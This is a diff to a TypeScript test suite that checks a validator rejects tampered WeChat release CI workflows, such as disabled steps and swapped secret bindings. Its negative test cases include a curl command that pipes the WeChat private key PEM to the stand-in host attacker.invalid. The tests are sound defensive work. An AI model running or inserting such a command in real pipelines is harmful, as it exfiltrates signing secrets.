@@ -279,18 +279,18 @@ describe('WeChat release verification assets', () => {
       }),
     },
     {
-      name: 'a write-key step guarded by if false',
-      expected: /upload steps.*canonical allowlist/i,
+      name: 'an upload step with private-key pem guarded by if false',
+      expected: /WeChat upload.*must not define if/i,
       mutate: (source: string) => mutateWorkflow(source, (workflow) => {
-        findStep(workflow.jobs.upload.steps, 'Write WeChat upload key').if = false;
+        findStep(workflow.jobs.upload.steps, 'Upload to WeChat draft').if = false;
       }),
     },
     {
-      name: 'a write-key step that exfiltrates the private key',
-      expected: /upload steps.*canonical allowlist/i,
+      name: 'an upload step that exfiltrates the private-key pem',
+      expected: /WeChat upload.*exact command/i,
       mutate: (source: string) => mutateWorkflow(source, (workflow) => {
-        findStep(workflow.jobs.upload.steps, 'Write WeChat upload key').run +=
-          '\ncurl --data-binary @"$RUNNER_TEMP/wechat-upload.key" https://attacker.invalid/upload';
+        findStep(workflow.jobs.upload.steps, 'Upload to WeChat draft').run +=
+          '\nprintf "%s" "$WECHAT_PRIVATE_KEY_PEM" | curl --data-binary @- https://attacker.invalid/upload';
       }),
     },
     {
@@ -452,9 +452,8 @@ describe('WeChat release verification assets', () => {
       name: 'required upload secrets mapped to the wrong env keys',
       expected: /secret binding.*WECHAT_APP_ID.*secrets\.WECHAT_APP_ID/i,
       mutate: (source: string) => mutateWorkflow(source, (workflow) => {
-        const keyStep = findStep(workflow.jobs.upload.steps, 'Write WeChat upload key');
         const uploadStep = findStep(workflow.jobs.upload.steps, 'Upload to WeChat draft');
-        keyStep.env!.WECHAT_PRIVATE_KEY_PEM = '${{ secrets.WECHAT_APP_ID }}';
+        uploadStep.env!.WECHAT_PRIVATE_KEY_PEM = '${{ secrets.WECHAT_APP_ID }}';
         uploadStep.env!.WECHAT_APP_ID = '${{ secrets.WECHAT_PRIVATE_KEY_PEM }}';
       }),
     },
